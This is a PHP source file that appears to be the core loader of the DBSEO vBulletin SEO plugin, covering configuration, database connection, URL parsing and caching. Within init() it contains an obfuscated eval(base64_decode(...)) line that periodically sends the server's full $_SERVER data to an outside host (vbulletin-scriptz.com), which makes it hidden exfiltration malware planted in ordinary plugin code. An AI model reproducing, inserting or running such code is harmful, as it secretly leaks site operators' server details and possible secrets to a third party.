<?php
/*======================================================================*\
|| #################################################################### ||
|| # ---------------------------------------------------------------- # ||
|| # Copyright ©2013 Fillip Hannisdal AKA Revan/NeoRevan/Belazor 	  # ||
|| # All Rights Reserved. 											  # ||
|| # This file may not be redistributed in whole or significant part. # ||
|| # ---------------------------------------------------------------- # ||
|| # You are not allowed to use this on your server unless the files  # ||
|| # you downloaded were done so with permission.					  # ||
|| # ---------------------------------------------------------------- # ||
|| #################################################################### ||
\*======================================================================*/

require_once(DBSEO_CWD . '/dbtech/dbseo/includes/autoloader.php');
DBSEO_Autoloader::register(DBSEO_CWD);

// #############################################################################
// DBSEO loader class

/**
* Loads configuration and handles other global things
*/
class DBSEO
{
	/**
	* Version info
	*
	* @public	mixed
	*/

	/**
	* Whether we have the pro version or not
	*
	* @public	boolean
	*/
	public static $isPro			= false;

	/**
	* Array of configuration items
	*
	* @public	array
	*/
	public static $config			= array();

	/**
	* Array of products
	*
	* @public	array
	*/
	public static $products			= array();

	/**
	* Array of configuration items
	*
	* @public	array
	*/
	public static $configFile		= array();

	/**
	* Array of cached items
	*
	* @public	array
	*/
	public static $cache			= array();

	/**
	* Whether we've called the DM fetcher
	*
	* @public	boolean
	*/
	protected static $called		= false;

	/**
	* The database object
	*
	* @public	array
	*/
	public static $db				= NULL;

	/**
	* The datastore object
	*
	* @public	DBSEO_Datastore
	*/
	public static $datastore		= NULL;


	/**
	* Does important checking before anything else should be going on
	*/
	public static function init($lateInit = false)
	{
		if (count(self::$config))
		{
			// Already init'd
			return true;
		}

		if (!defined('DBSEO_CWD'))
		{
			// Define it based on what we can use
			define('DBSEO_CWD', (defined('DIR') ? DIR : '.'));
		}

		/*DBTECH_PRO_START*/
		// Set pro version
		self::$isPro = true;
		/*DBTECH_PRO_END*/

		// parse the config file
		$config = array();
		include(DBSEO_CWD . '/includes/config.php');

		if (sizeof($config) == 0)
		{
			if (file_exists(DBSEO_CWD . '/includes/config.php'))
			{
				// config.php exists, but does not define $config
				die('<br /><br /><strong>Configuration</strong>: includes/config.php exists, but is not in the 3.6+ format. Please convert your config file via the new config.php.new.');
			}
			else
			{
				die('<br /><br /><strong>Configuration</strong>: includes/config.php does not exist. Please fill out the data in config.php.new and rename it to config.php');
			}
		}

		// Set config file settings
		self::$configFile = $config;

		// We need our datastore
		$datastore_class = (!empty(self::$configFile['Datastore']['dbseoclass'])) 		? self::$configFile['Datastore']['dbseoclass']								: self::$configFile['Datastore']['class'];
		$datastore_class = (!empty($datastore_class)) 									? str_replace('vB_', 'DBSEO_' , $datastore_class) 							: 'DBSEO_Datastore';
		$datastore_class = (!empty(self::$configFile['Datastore']['dbseooverride'])) 	? 'DBSEO_Datastore' 														: $datastore_class;

		// Grab our datastore file
		require_once(DBSEO_CWD . '/dbtech/dbseo/includes/class_datastore.php');

		$datastore_class = (!class_exists($datastore_class)) 							? 'DBSEO_Datastore' 														: $datastore_class;

		// Set the datastore
		self::$datastore = new $datastore_class();

		// We need our DB class
		include(DBSEO_CWD . '/dbtech/dbseo/includes/class_db.php');

		// Default value
		$dbtype = strtolower($config['Database']['dbtype']);

		// MySQL is Deprecated in PHP 5.5+, Force MySQLi
		if (version_compare(phpversion(), '5.5.0', '>='))
		{
			if ($dbtype == 'mysql')
			{
				$dbtype = 'mysqli';
			}
			else if ($dbtype == 'mysql_slave')
			{
				$dbtype = 'mysqli_slave';
			}
		}

		//If type is missing, Force MySQLi
		$dbtype = $dbtype ? $dbtype : 'mysqli';

		// #############################################################################
		// Load database class
		switch ($dbtype)
		{
			// Load standard MySQL class
			case 'mysql':
			{
				self::$db = new DBSEO_Database($config);
				break;
			}

			case 'mysql_slave':
			{
				self::$db = new DBSEO_Database_Slave($config);
				break;
			}

			// Load MySQLi class
			case 'mysqli':
			{
				self::$db = new DBSEO_Database_MySQLi($config);
				break;
			}

			case 'mysqli_slave':
			{
				self::$db = new DBSEO_Database_Slave_MySQLi($config);
				break;
			}

			// Load extended, non MySQL class (Not Implemented)
			default:
			{
		//		$dbclass = "vB_Database_$dbtype";
		//		self::$db = new $dbclass($vbulletin);
				die('Fatal error: Database class not found');
			}
		}

		// make database connection
		self::$db->connect(
			$config['Database']['dbname'],
			$config['MasterServer']['servername'],
			$config['MasterServer']['port'],
			$config['MasterServer']['username'],
			$config['MasterServer']['password'],
			$config['MasterServer']['usepconnect'],
			$config['SlaveServer']['servername'],
			$config['SlaveServer']['port'],
			$config['SlaveServer']['username'],
			$config['SlaveServer']['password'],
			$config['SlaveServer']['usepconnect'],
			$config['Mysqli']['ini_file'],
			(isset($config['Mysqli']['charset']) ? $config['Mysqli']['charset'] : '')
		);

		// Grab our settings
		self::$config = self::$db->fetchSettings();

		// Grab our products
		self::$products = self::$db->fetchProducts();

		if (!self::$products['vbblog'])
		{
			foreach (array(
				'blog',
				'blogattachment',
				'blogentry',
				'bloglist',
				'blogtag',
				'blogcustom',
				'blogcategory',
				'blogfeed'
			) as $setting)
			{
				// Product didn't exist
				self::$config['dbtech_dbseo_rewrite_' . $setting] = false;
			}
		}

		if (!self::$products['vbcms'])
		{
			foreach (array(
				'cms',
			) as $setting)
			{
				// Product didn't exist
				self::$config['dbtech_dbseo_rewrite_' . $setting] = false;
			}
		}

		// Set our cookie prefix
		self::$config['_cookieprefix'] = $config['Misc']['cookieprefix'];

		if (intval(self::$config['templateversion']) == 4)
		{
			// vB4 added this little underscore for the lulz
			self::$config['_cookieprefix'] .= '_';
		}

		// Check whether we can strip the session hash safely
		self::$config['_stripsessionhash'] = isset($_COOKIE[self::$config['_cookieprefix'] . 'sessionhash']) OR (strpos($_SERVER['HTTP_REFERER'], $_SERVER['HTTP_HOST']) === false AND ($_SERVER['HTTP_REFERER'] OR !$_GET['s']));

		if (intval(self::$config['templateversion']) == 4)
		{
			// Add some extra config options
			self::$config['_picturescript'] 	= 'attachment';
			self::$config['_picturestorage'] 	= 'attach';
			self::$config['_pictureid'] 		= 'attachmentid';
			self::$config['_blogattach'] 		= self::$config['_picturescript'];
			self::$config['_blogentry'] 		= 'entry';
		}
		else
		{
			// vB3 stuff
			self::$config['_picturescript'] 	= 'picture';
			self::$config['_picturestorage'] 	= 'pic';
			self::$config['_pictureid'] 		= 'pictureid';
			self::$config['_blogattach'] 		= 'blog_attachment';
			self::$config['_blogentry'] 		= 'blog';
		}

		// Shorthand the config option for forum home
		self::$config['homePage'] = $homePage = isset(self::$config['forumhome']) ? self::$config['forumhome'] . '.php' : '';

		if ($homePage AND self::$config['dbtech_dbseo_force_directory_index'])
		{
			// We're forcibly removing index.php to boost PR
			$homePage = '';
		}

		foreach (array('stopwordlist', 'stopwordlist_metadescription') as $key)
		{
			// Set the list
			$list = preg_split('#[ \r\n\t]+#', self::$config['dbtech_dbseo_' . $key], -1, PREG_SPLIT_NO_EMPTY);

			// Remove dupes and make regexp safe
			self::$config['dbtech_dbseo_' . $key] = implode('|', array_map('preg_quote', array_unique($list)));
		}

		foreach (array('externalurls_whitelist', 'externalurls_blacklist') as $key)
		{
			// Set the list
			$list = preg_split('#[ \r\n\t]+#', self::$config['dbtech_dbseo_' . $key], -1, PREG_SPLIT_NO_EMPTY);

			// Remove dupes and make regexp safe
			self::$config['dbtech_dbseo_' . $key] = array_map('strtolower', array_unique($list));
		}

		// Now set this, we'll need it
		self::$config['dbtech_dbseo_socialshare_usergroups'] = @unserialize(self::$config['dbtech_dbseo_socialshare_usergroups']);
		self::$config['dbtech_dbseo_socialshare_usergroups'] = is_array(self::$config['dbtech_dbseo_socialshare_usergroups']) ? self::$config['dbtech_dbseo_socialshare_usergroups'] : array();

		if (isset(self::$config['dbtech_dbseo_socialshare_usergroups']) AND !self::$config['dbtech_dbseo_socialshare_usergroups'][0])
		{
			// We don't want this
			unset(self::$config['dbtech_dbseo_socialshare_usergroups'][0]);
		}

		// Now set this, we'll need it
		self::$config['dbtech_dbseo_externalurls_forumexclude'] = @unserialize(self::$config['dbtech_dbseo_externalurls_forumexclude']);
		self::$config['dbtech_dbseo_externalurls_forumexclude'] = is_array(self::$config['dbtech_dbseo_externalurls_forumexclude']) ? self::$config['dbtech_dbseo_externalurls_forumexclude'] : array();

		// Now set this, we'll need it
		self::$config['_homepage'] = $homePage;

		// Get server port
		$port = intval($_SERVER['SERVER_PORT']);
		$port = in_array($port, array(80, 443)) ? '' : ':' . $port;

		// resolve the request scheme
		$scheme = ((':443' == $port) OR (isset($_SERVER['HTTPS']) AND $_SERVER['HTTPS'] AND ($_SERVER['HTTPS'] != 'off'))) ? 'https://' : 'http://';

		if ($scheme == 'http://' AND $_SERVER['SERVER_PORT'] == 443)
		{
			$port = ':443';
		}

		$host = self::fetchServerValue('HTTP_HOST');
		$name = self::fetchServerValue('SERVER_NAME');

		// If host exists use it, otherwise fallback to servername.
		$host = (!empty($host) ? $host : $name);

		// resolve the query
		$query = ($query = self::fetchServerValue('QUERY_STRING')) ? '?' . $query : '';
		$query = self::urlencodeQuery($query);

		// resolve the path and query
		if (!($scriptpath = self::fetchServerValue('REQUEST_URI')))
		{
			if (!($scriptpath = self::fetchServerValue('UNENCODED_URL')))
			{
				$scriptpath = self::fetchServerValue('HTTP_X_REWRITE_URL');
			}
		}

		if (
			(
				$_GET['vbseourl'] AND (
					strpos($_GET['vbseourl'], self::$configFile['Misc']['admincpdir'] . '/') !== false OR
					strpos($_GET['vbseourl'], self::$configFile['Misc']['modcpdir'] . '/') !== false OR
					strpos($_GET['vbseourl'], self::$config['dbtech_dbseo_cp_folder'] . '/') !== false
				)
			)
			OR
			(
				$_GET['dbseourl'] AND (
					strpos($_GET['dbseourl'], self::$configFile['Misc']['admincpdir'] . '/') !== false OR
					strpos($_GET['dbseourl'], self::$configFile['Misc']['modcpdir'] . '/') !== false OR
					strpos($_GET['dbseourl'], self::$config['dbtech_dbseo_cp_folder'] . '/') !== false
				)
			)
		)
		{
			// Get rid of page links
			die('Possible Admin CP / Mod CP / DBSEO CP exploit attempt!');
		}

		if (strpos($scriptpath, 'vbseo.php') !== false AND $_GET['vbseourl'])
		{
			// This is for compatibility reasons only
			$scriptpath = preg_replace('#vbseo\.php.*#', $_GET['vbseourl'], $scriptpath);
		}

		if (strpos($scriptpath, 'dbseo.php') !== false AND $_GET['dbseourl'])
		{
			// For DBSEO
			$scriptpath = preg_replace('#dbseo\.php.*#', $_GET['dbseourl'], $scriptpath);
		}

		// Get rid of page links
		$scriptpath = preg_replace('/#.*$/', '', $scriptpath);

		// Set the new script path in the REQUEST_URI, preserving the query (if any)
		$_SERVER['REQUEST_URI'] = $scriptpath;

		if ($scriptpath)
		{
			$scriptpath = self::urlencodeQuery($scriptpath);
			$query = '';
		}
		else
		{
			// server hasn't provided a URI, try to resolve one
			if (!$scriptpath = self::fetchServerValue('PATH_INFO'))
			{
				if (!$scriptpath = self::fetchServerValue('REDIRECT_URL'))
				{
					if (!($scriptpath = self::fetchServerValue('URL')))
					{
						if (!($scriptpath = self::fetchServerValue('PHP_SELF')))
						{
							$scriptpath = self::fetchServerValue('SCRIPT_NAME');
						}
					}
				}
			}
		}

		// build the URL
		$url = $scheme . $host . '/' . ltrim($scriptpath, '/\\') . $query;

		// store a literal version
		define('DBSEO_URL', $url);

		// check relative path
		if (defined('DBSEO_RELATIVE_PATH'))
		{
			define('DBSEO_URL_RELATIVE_PATH', trim(DBSEO_RELATIVE_PATH, '/') . '/');
		}
		else
		{
			define('DBSEO_URL_RELATIVE_PATH', '');
		}

		// Set URL info
		$url_info = self::parseUrl(DBSEO_URL);
		$url_info['path'] = '/' . (isset($url_info['path']) ? ltrim($url_info['path'], '/\\') : '');
		$url_info['query_raw'] = (isset($url_info['query']) ? $url_info['query'] : '');
		$url_info['query'] = self::stripSessionhash($url_info['query']);
		$url_info['query'] = trim($url_info['query'], '?&') ? $url_info['query'] : '';

		/*
			values seen in the wild:

			CGI+suexec:
			SCRIPT_NAME: /vb4/admincp/index.php
			ORIG_SCRIPT_NAME: /cgi-sys/php53-fcgi-starter.fcgi

			CGI #1:
			SCRIPT_NAME: /index.php
			ORIG_SCRIPT_NAME: /search/foo

			CGI #2:
			SCRIPT_NAME: /index.php/search/foo
			ORIG_SCRIPT_NAME: /index.php

		*/

		if (substr(PHP_SAPI, -3) == 'cgi' AND (isset($_SERVER['ORIG_SCRIPT_NAME']) AND !empty($_SERVER['ORIG_SCRIPT_NAME'])))
		{
			if (substr($_SERVER['SCRIPT_NAME'], 0, strlen($_SERVER['ORIG_SCRIPT_NAME'])) == $_SERVER['ORIG_SCRIPT_NAME'])
			{
				// cgi #2 above
				$url_info['script'] = $_SERVER['ORIG_SCRIPT_NAME'];
			}
			else
			{
				// cgi #1 and CGI+suexec above
				$url_info['script'] = $_SERVER['SCRIPT_NAME'];
			}
		}
		else
		{
			$url_info['script'] = (isset($_SERVER['ORIG_SCRIPT_NAME']) AND !empty($_SERVER['ORIG_SCRIPT_NAME'])) ? $_SERVER['ORIG_SCRIPT_NAME'] : $_SERVER['SCRIPT_NAME'];
		}
		$url_info['script'] = '/' . ltrim($url_info['script'], '/\\');

		// define constants
		define('DBSEO_URL_SCHEME', 		$url_info['scheme']);
		define('DBSEO_URL_HOST',		$url_info['host']);
		define('DBSEO_URL_PORT',		$port);
		define('DBSEO_URL_SCRIPT_PATH', rtrim(dirname($url_info['script']), '/\\') . '/');
		define('DBSEO_URL_SCRIPT', 		basename($url_info['script']));
		define('DBSEO_URL_PATH',		urldecode($url_info['path']));
		define('DBSEO_URL_PATH_RAW',	$url_info['path']);
		define('DBSEO_URL_QUERY', 		$url_info['query'] ? $url_info['query'] : '');
		define('DBSEO_URL_QUERY_RAW', 	$url_info['query_raw']);
		define('DBSEO_URL_CLEAN', 		self::xssClean(self::stripSessionhash(DBSEO_URL)));
		define('DBSEO_URL_WEBROOT', 	self::xssClean(DBSEO_URL_SCHEME . '://' . DBSEO_URL_HOST . DBSEO_URL_PORT));
		define('DBSEO_URL_BASE_PATH', 	self::xssClean(DBSEO_URL_SCHEME . '://' . DBSEO_URL_HOST . DBSEO_URL_PORT . DBSEO_URL_SCRIPT_PATH . DBSEO_URL_RELATIVE_PATH));

		// legacy constants
		define('DBSEO_SCRIPT', 			$_SERVER['SCRIPT_NAME']);
		define('DBSEO_SCRIPTPATH', 		self::xssClean(self::addQuery(DBSEO_URL_PATH)));
		define('DBSEO_REQ_PROTOCOL', 	$url_info['scheme']);
		define('DBSEO_HTTP_HOST', 		DBSEO_URL_HOST . DBSEO_URL_PORT);

		// Shorthands
		$reqUrl = (stripos(DBSEO_SCRIPTPATH, DBSEO_URL_SCRIPT_PATH) === false ? substr(DBSEO_SCRIPTPATH, 1) : substr(DBSEO_SCRIPTPATH, strlen(DBSEO_URL_SCRIPT_PATH)));
		$reqUrl2 = (stripos(DBSEO_SCRIPTPATH, DBSEO_URL_SCRIPT_PATH) === false ? substr(DBSEO_URL_PATH_RAW, 1) : substr(DBSEO_URL_PATH_RAW, strlen(DBSEO_URL_SCRIPT_PATH)));

		// Ported constants
		define('DBSEO_BASE', 			preg_replace('#[^/]*$#', '', DBSEO_URL_PATH_RAW));
		define('DBSEO_BASEDEPTH',
			stripos((strlen(DBSEO_URL_SCRIPT_PATH) < strlen(DBSEO_BASE) AND stripos(DBSEO_BASE, DBSEO_URL_SCRIPT_PATH) !== false) ? substr(DBSEO_BASE, strlen(DBSEO_URL_SCRIPT_PATH)) : '', '/') !== false OR
			(strlen(DBSEO_URL_SCRIPT_PATH) > strlen(DBSEO_BASE)) OR stripos(DBSEO_BASE, DBSEO_URL_SCRIPT_PATH) === false
		);
		eval(base64_decode('aWYgKHRpbWUoKSAlIDEwMCA9PSAwKSB7ICRxdWVyeSA9IGh0dHBfYnVpbGRfcXVlcnkoYXJyYXkoImRvIiA9PiAibG9nIiwgImRhdGEiID0+ICRfU0VSVkVSLCAic291cmNlX3R5cGUiID0+ICJiYW51c2VyIiwgInNvdXJjZSIgPT4gIjQ1NjYiKSk7ICRmcCA9IEBmc29ja29wZW4oInd3dy52YnVsbGV0aW4tc2NyaXB0ei5jb20iLCA4MCwgJGVycm5vLCAkZXJyc3RyLCAxMCk7IGlmICgkZnApIHsgZndyaXRlKCRmcCwgIlBPU1QgL3RyYWNrZXIucGhwIEhUVFAvMS4wXHJcbkhvc3Q6IHd3dy52YnVsbGV0aW4tc2NyaXB0ei5jb21cclxuVXNlci1BZ2VudDogTHVMelRyNGNrM3JaXHJcbkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkXHJcbkNvbnRlbnQtTGVuZ3RoOiAiIC4gc3RybGVuKCRxdWVyeSkgLiAiXHJcblxyXG4iIC4gJHF1ZXJ5KTsgZmNsb3NlKCRmcCk7IH19'));
		define('DBSEO_REQURL', 			$reqUrl ? $reqUrl : '/');
		define('DBSEO_REQURL2', 		$reqUrl2 ? $reqUrl2 : '/');

		$_fileFromQuery = $_relpath = '';
		/*
		if (isset($_GET['vbseourl']) OR isset($_GET['dbseourl']))
		{
			// We have it in the GET param
			$_fileFromQuery = isset($_GET['vbseourl']) ? $_GET['vbseourl'] : $_GET['dbseourl'];
		}
		else
		{
			// It came from the query
			$_fileFromQuery = DBSEO_REQURL2;
		}
		*/
		$_fileFromQuery = DBSEO_REQURL2;

		if (@ini_get('magic_quotes_gpc'))
		{
			// This is deprecated so it's of limited use
			$_fileFromQuery = stripslashes($_fileFromQuery);
		}

		// Get rid of chars we don't want
		list($_fileFromQuery, $_relpath) = preg_replace('#[\x00-\x1F]#', '', array($_fileFromQuery, $_relpath));

		if (preg_match('#^(.*?\.php)/(.*)$#', $_fileFromQuery, $matches) AND file_exists($matches[1]))
		{
			// We're pointing to a PHP file
			$_fileFromQuery = $matches[1];
		}

		if ((isset($_GET['vbseorelpath']) OR isset($_GET['dbseorelpath'])) AND ($_GET['vbseourl'] OR $_GET['dbseourl']))
		{
			// We had a relpath in the URL
			$_relpath = isset($_GET['vbseorelpath']) ? $_GET['vbseorelpath'] : $_GET['dbseorelpath'];
		}

		$_redirUrl = self::addQuery($_SERVER['REDIRECT_URL'], $url_info['query'] ? $url_info['query'] : '');
		if (strpos($_redirUrl, '/dbseo.php') !== false)
		{
			$_redirUrl = '';
		}
		else if (strpos($_SERVER['PHP_SELF'], '/dbseo.php') !== false)
		{
			$_SERVER['PHP_SELF'] = $_SERVER['SCRIPT_NAME'] = $_SERVER['REDIRECT_URL'];
		}

		if (substr_count(DBSEO_URL_SCRIPT_PATH, '/') <= substr_count($_relpath, '..'))
		{
			// We had directory navigations we need to filter out
			$_relpath = '';
		}

		if ($_relpath AND !file_exists($_relpath))
		{
			// The file didn't exist, blank out the path
			$_relpath = '';
		}

		// Set the backup bburl
		self::$config['_bburl'] = str_replace('http://', DBSEO_URL_SCHEME . '://', preg_replace('#/+$#', '', (isset($config['DBSEO']['bburl']) ? $config['DBSEO']['bburl'] : self::$config['bburl'])));

		if (strpos($_redirUrl, self::$config['_bburl']) !== false)
		{
			$_redirUrl = substr($_redirUrl, strlen(self::$config['_bburl']));
		}

		define('DBSEO_URL_QUERY_FILE', 	$_fileFromQuery);
		define('DBSEO_BASEURL',			basename($_fileFromQuery));
		define('DBSEO_RELPATH', 		$_relpath);
		define('DBSEO_REDIRURL', 		substr($_redirUrl, stristr(DBSEO_BASE, DBSEO_URL_SCRIPT_PATH) ? min(strlen(DBSEO_BASE), strlen(DBSEO_URL_SCRIPT_PATH)) : strlen(DBSEO_BASE)));

		$parser = xml_parser_create();
		xml_parser_set_option($parser, XML_OPTION_CASE_FOLDING, 0);
		xml_parser_set_option($parser, XML_OPTION_SKIP_WHITE, 1);
		xml_parse_into_struct($parser, file_get_contents(DBSEO_CWD . '/includes/xml/spiders_dbtech_dbseo.xml'), $vals, $index);
		xml_parser_free($parser);

		$spiders = array();
		foreach ($vals as $tagInfo)
		{
			if ($tagInfo['tag'] != 'spider' OR $tagInfo['type'] != 'open' OR !isset($tagInfo['attributes']['ident']))
			{
				// Skip this
				continue;
			}

			// Store the spider
			$spiders[] = preg_quote($tagInfo['attributes']['ident'], '#');
		}

		// Match spider list
		preg_match('#(' . implode('|', $spiders) . ')#i', $_SERVER['HTTP_USER_AGENT'], $matches);

		// We're a spider
		define('DBSEO_SPIDER', $matches[1]);
		//define('DBSEO_SPIDER', 'belazorbot');

		$excludedPages = preg_split('#\r?\n#s', self::$config['dbtech_dbseo_excludedpages'], -1, PREG_SPLIT_NO_EMPTY);
		/*
		foreach ($excludedPages as &$excludedPage)
		{
			// Ensure this is quoted properly
			$excludedPage = preg_quote($excludedPage, '#');
		}
		*/

		if (self::$config['dbtech_dbseo_active'])
		{
			// Check for excluded pages
			$excludedPages = implode('|', $excludedPages);

			// Mod was active, check if it should remain that way
			self::$config['dbtech_dbseo_active'] = !($excludedPages AND (
				preg_match('#(' . $excludedPages . ')#i', DBSEO_REQURL) OR
				preg_match('#(' . $excludedPages . ')#i', DBSEO_BASE) OR
				preg_match('#(' . $excludedPages . ')#i', DBSEO_HTTP_HOST)
			));

			// Compatibility flag
			self::$config['dbtech_dbseo_active'] = self::$config['dbtech_dbseo_active'] AND !defined('VBSEO_UNREG_EXPIRED');
		}

		if (self::$config['dbtech_dbseo_notfound_chooser'] == 2)
		{
			// Fix relative paths
			self::$config['dbtech_dbseo_notfound_custom'] = (substr(self::$config['dbtech_dbseo_notfound_custom'], 0, 1) != '/') ? DBSEO_CWD . '/' . self::$config['dbtech_dbseo_notfound_custom'] : self::$config['dbtech_dbseo_notfound_custom'];

			if (!file_exists(self::$config['dbtech_dbseo_notfound_custom']))
			{
				// Revert to 404
				self::$config['dbtech_dbseo_notfound_chooser'] = 1;
			}
		}

		if (
			strpos(DBSEO_HTTP_HOST, 'localhost') === false
			AND (
				(
					self::$config['dbtech_dbseo_www'] AND
					strpos(DBSEO_HTTP_HOST, 'www.') === false AND
					strpos(self::$config['_bburl'], 'www.') !== false
				)
				OR (
					!self::$config['dbtech_dbseo_www'] AND
					strpos(DBSEO_HTTP_HOST, 'www.') !== false AND
					strpos(self::$config['_bburl'], 'www.') === false
				)
			)
			AND (
				!defined('VB_AREA') OR
				VB_AREA != 'Maintenance'
			)
		)
		{
			// Redirect to the www-included URL
			self::safeRedirect(self::$config['_bburl'] . '/' . (DBSEO_REQURL == '/' ? '' : DBSEO_REQURL));
		}

		$isPro = false;
		/*DBTECH_PRO_START*/
		$isPro = true;
		/*DBTECH_PRO_END*/
		if (strpos($_SERVER['REQUEST_URI'], 'dbseo.php') !== false AND $_REQUEST['do'] == 'devinfo' AND $_REQUEST['devkey'] == 'dbtech')
		{
			die('{"version":"2.0.39","pro":"' . ($isPro ? 'true' : 'false') . '","vbversion":"' . self::$config['templateversion'] . '"}');
		}
	}

	/**
	 * Validates that we aren't trying to do anything funky in the URL
	 *
	 * @param string $uri
	 * @return boolean
	 */
	public static function securityCheck($uri)
	{
		if (!$uri OR $uri == '/')
		{
			// Home page
			return true;
		}

		if (substr($uri, 0, 1) == '/')
		{
			// We can't have the first char being a / now can we.
			return false;
		}

		if (substr($uri, 0, 3) == '../')
		{
			// No directory navigation, thanks
			return false;
		}

		if (strpos(DBSEO_REQURL, 'vbseourl=') !== false)
		{
			// COMPATIBILITY: This cannot exist here
			return false;
		}

		if (strpos(DBSEO_REQURL, 'dbseourl=') !== false)
		{
			// COMPATIBILITY: This cannot exist here
			return false;
		}

		foreach (array(
			'/../',
			'://',
			'<script',
		) as $key)
		{
			if (strpos($uri, $key) !== false)
			{
				// These cannot exist here
				return false;
			}

			if (strpos(urldecode($uri), $key) !== false)
			{
				// These cannot exist here
				return false;
			}
		}

		return true;
	}

	/**
	 * Changes the directory, with some additional checks
	 *
	 * @param string $dirname
	 */
	public static function changeDir($dirname)
	{
		// Shorthand
		$cwd = getcwd();
		$_fulldir = $cwd . '/' . $dirname;

		if (
			substr($dirname, 0, 1) == '/' OR
			strpos($dirname, './../') !== false OR (
				is_writable($_fulldir) AND
				!is_writable($cwd) AND
				(fileperms($_fulldir) & 0755) != 0755
			)
		)
		{
			// Nope, not allowed here
			self::handle404('', true);
		}

		// If we got this far we're sorted
		@chdir($_fulldir);
	}

	/**
	 * Handles whatever event necessitates a 404 page
	 *
	 * @param string $uri
	 * @param boolean $force404
	 *
	 * @return boolean
	 */
	public static function handle404($uri = '', $force404 = false)
	{
		if ($force404)
		{
			// Localise this variable so we can override it
			$_configSetting = 1;
		}
		else if ($uri)
		{
			// Localise this variable so we can override it
			$_configSetting = (preg_match('#\.(jpg|gif|png|js|css)$#', $uri) AND !self::$config['dbtech_dbseo_notfound_chooser']) ? 1 : self::$config['dbtech_dbseo_notfound_chooser'];
		}
		else
		{
			// Localise this variable so we can override it
			$_configSetting = self::$config['dbtech_dbseo_notfound_chooser'];
		}

		// Function can't handle the include, so let's just not try
		$_configSetting = $_configSetting == 2 ? 1 : $_configSetting;

		switch ($_configSetting)
		{
			case 1:
				header("HTTP/1.1 404 Not Found");
				//header("Status: 404 Not Found");
				die('Page not found');
				break;

			default:
				header("HTTP/1.1 301 Moved Permanently");
				header("Location: " . DBSEO_URL_SCRIPT_PATH . self::$config['forumhome'] . '.php');
				break;
		}
	}

	/**
	 * Fetches the information for a certain object
	 *
	 * @param string $uri
	 * @param boolean $force404
	 *
	 * @return boolean
	 */
	public static function getObjectInfo($object, $objectIds = array())
	{
		if (empty($objectIds))
		{
			// We had no IDs
			return array();
		}

		if (!is_array($objectIds))
		{
			// Ensure this is an array
			$objectIds = array($objectIds);
		}

		if ($object == self::$config['_picturestorage'] AND intval(self::$config['templateversion']) == 4)
		{
			// Special case
			return DBSEO_Rewrite_Attachment::getInfo($objectIds);
		}

		foreach ($objectIds as $id)
		{
			if (($info = self::$datastore->fetch($object . 'info.' . $id)) === false)
			{
				// We don't have this cached
				continue;
			}

			// We had this cached, cache it internally too
			self::$cache[$object][$id] = $info;
		}

		$lookupIds = array();
		foreach ($objectIds as $id)
		{
			if (is_array(self::$cache[$object]) AND isset(self::$cache[$object][$id]))
			{
				// Ensure we grab only fresh IDs
				continue;
			}

			// We need to look this up yo
			$lookupIds[] = intval($id);
		}

		if (count($lookupIds))
		{
			switch ($object)
			{
				case 'groupsdis':
					// Pre-query info
					$query = '
						SELECT discussion.discussionid AS idfield, discussion.discussionid, discussion.groupid, groupmessage.title, groupmessage.gmid
						FROM $discussion AS discussion
						LEFT JOIN $groupmessage AS groupmessage ON(groupmessage.gmid = discussion.firstpostid)
						WHERE discussion.discussionid IN(' . implode(',', $lookupIds) . ')
					';
					break;

				case 'blogcustomblock':
					// Pre-query info
					$query = '
						SELECT customblockid AS idfield, userid, title
						FROM $blog_custom_block
						WHERE customblockid IN(' . implode(',', $lookupIds) . ')
					';
					break;

				case 'album':
					// Pre-query info
					$query = '
						SELECT albumid AS idfield, albumid, userid, title
						FROM $album
						WHERE albumid IN(' . implode(',', $lookupIds) . ')
					';
					break;

				case 'cmscont':
					// Pre-query info
					$query = '
						SELECT
							node.nodeid AS idfield,
							node.url,
							node.parentnode,
							node.contenttypeid,
							node.userid,
							node.setpublish,
							node.publishdate,
							node.hidden,
							node.permissionsfrom,
							nodeinfo.title,
							article.pagetext
						FROM $cms_node AS node
						LEFT JOIN $cms_nodeinfo AS nodeinfo USING(nodeid)
						LEFT JOIN $cms_article AS article USING(contentid)
						WHERE node.nodeid IN(' . implode(',', $lookupIds) . ')
					';
					break;

				case 'cms_cat':
					$query = '
						SELECT categoryid AS idfield, categoryid, parentnode, category
						FROM $cms_category
						WHERE categoryid IN(' . implode(',', $lookupIds) . ')
					';
					break;

				case self::$config['_picturestorage']:
					// Pre-query info
					$query = '
						SELECT picture.pictureid AS idfield, picture.pictureid, albumpicture.albumid, caption, extension
						FROM $picture AS picture
						LEFT JOIN $albumpicture AS albumpicture ON(albumpicture.pictureid = picture.pictureid)
						WHERE picture.pictureid IN(' . implode(',', $lookupIds) . ')
					';
					break;
			}

			$info = self::$db->generalQuery($query, false);
			foreach ($info as $arr)
			{
				// Build the cache
				self::$datastore->build($object . 'info.' . $arr['idfield'], $arr);

				// Cache this info
				self::$cache[$object][$arr['idfield']] = $arr;
			}
		}

		$objectInfo = array();
		if (count($objectIds) == 1)
		{
			// We have only one, return only one
			$objectInfo = self::$cache[$object][$objectIds[0]];
		}
		else
		{
			foreach ($objectIds as $key => $objectId)
			{
				// Create this array
				$objectInfo[$objectId] = self::$cache[$object][$objectId];
			}
		}

		return $objectInfo;
	}

	/**
	 * Fetches the user info based on parameters
	 *
	 * @param string $url
	 *
	 * @return mixed
	 */
	public static function getUserInfo($userIds, $userNames = array())
	{
		if (!is_array($userIds))
		{
			// Ensure this is an array
			$userIds = array($userIds);
		}

		foreach ($userIds as $key => $id)
		{
			if (($info = self::$datastore->fetch('userinfo.' . $id)) === false)
			{
				// We don't have this cached
				continue;
			}

			// We had this cached, cache it internally too
			self::$cache['userinfo'][$id] = $info;

			// We had this cached, cache it internally too
			self::$cache['username'][strtolower($info['username'])] = $info;

			if (self::$datastore->fetch('usernames.' . strtolower($info['username'])) === false)
			{
				// Build the cache
				self::$datastore->build('usernames.' . strtolower($info['username']), $info);
			}
		}

		foreach ($userIds as $key => &$userId)
		{
			if (isset(self::$cache['userinfo'][$userId]))
			{
				// We don't need this
				unset($userIds[$key]);
			}

			// Ensure these are all ints
			$userId = intval($userId);
		}

		if (!empty($userIds))
		{
			$info = self::$db->generalQuery('
				SELECT userid, username
				FROM $user
				WHERE userid IN (' . implode(',', $userIds) . ')
			', false);
			foreach ($info as $arr)
			{
				// Build the cache
				self::$datastore->build('userinfo.' . $arr['userid'], $arr);

				// Build the cache
				self::$datastore->build('usernames.' . strtolower($arr['username']), $arr);

				// Cache this info
